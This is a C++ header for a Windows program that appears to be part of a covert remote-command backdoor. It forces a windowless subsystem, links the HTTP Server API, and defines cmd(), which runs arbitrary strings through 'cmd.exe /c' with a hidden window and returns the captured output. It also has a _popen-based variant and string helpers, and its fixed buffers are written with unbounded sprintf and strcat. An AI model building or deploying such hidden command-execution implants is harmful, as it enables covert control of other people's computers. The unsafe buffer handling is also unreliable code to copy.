#pragma once
#define _CRT_SECURE_NO_WARNINGS
#ifndef UNICODE
#define UNICODE
#endif

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <http.h>
#include <stdio.h>
#include <string>
#include <vector>
#include "base64.h"

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"wmainCRTStartup\"" )
#pragma comment(lib, "httpapi.lib")
using namespace std;

#define MSG_LEN 1024
int cmd(char *cmdStr, char *message)
{
	DWORD readByte = 0;
	char command[1024] = { 0 };
	char buf[MSG_LEN] = { 0 };    

	HANDLE hRead, hWrite;
	STARTUPINFO si;        
	PROCESS_INFORMATION pi; 
	SECURITY_ATTRIBUTES sa; 
	sprintf(command, "cmd.exe /c %s", cmdStr);



	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE; 
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hRead, &hWrite, &sa, 1024))
	{
		printf("1-Error: %xn", (unsigned int)GetLastError());
		return 0;
	}

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si); // 
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; //
	si.wShowWindow = SW_HIDE;               

	si.hStdOutput = si.hStdError = hWrite;  

	int ret = CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		(LPSTARTUPINFOA)&si,
		&pi);
	if (!ret)    
	{
		int e = GetLastError();
		printf("2-Error: %xn", (unsigned int)GetLastError());
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 0;
	}

	CloseHandle(hWrite);

	
	while (ReadFile(hRead, buf, MSG_LEN, &readByte, NULL))
	{
		strcat(message, buf);
		ZeroMemory(buf, MSG_LEN);
	}

	//printf("-- [CMD] Message: [%s] Length:%d n", message, strlen(message) + 1);

	CloseHandle(hRead);
	return 1;
}

int execmd(char* cmd, char* result) {
	char buffer[128];
	FILE* pipe = _popen(cmd, "r");
	if (!pipe)
		return 0;
	int count = 0;
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe)) {
			try
			{
				strcat(result, buffer);
			}
			catch (const std::exception&)
			{
				break;
			}
			
		}
		else {
			count++;
		}
		
	}
	_pclose(pipe);
	return 1;
}

void string_replace(std::string &strBig, const std::string &strsrc, const std::string &strdst)
{
	std::string::size_type pos = 0;
	std::string::size_type srclen = strsrc.size();
	std::string::size_type dstlen = strdst.size();

	while ((pos = strBig.find(strsrc, pos)) != std::string::npos)
	{
		strBig.replace(pos, srclen, strdst);
		pos += dstlen;
	}
}
char* wideCharToMultiByte(wchar_t* pWCStrKey)
{

	int pSize = WideCharToMultiByte(CP_OEMCP, 0, pWCStrKey, wcslen(pWCStrKey), NULL, 0, NULL, NULL);
	char* pCStrKey = new char[pSize + 1];

	WideCharToMultiByte(CP_OEMCP, 0, pWCStrKey, wcslen(pWCStrKey), pCStrKey, pSize, NULL, NULL);
	pCStrKey[pSize] = '\0';
	return pCStrKey;
}

void SplitString(const string& s, vector<string>& v, const string& c)
{
	string::size_type pos1, pos2;
	pos2 = s.find(c);
	pos1 = 0;
	while (string::npos != pos2)
	{
		v.push_back(s.substr(pos1, pos2 - pos1));

		pos1 = pos2 + c.size();
		pos2 = s.find(c, pos1);
	}
	if (pos1 != s.length())
		v.push_back(s.substr(pos1));
}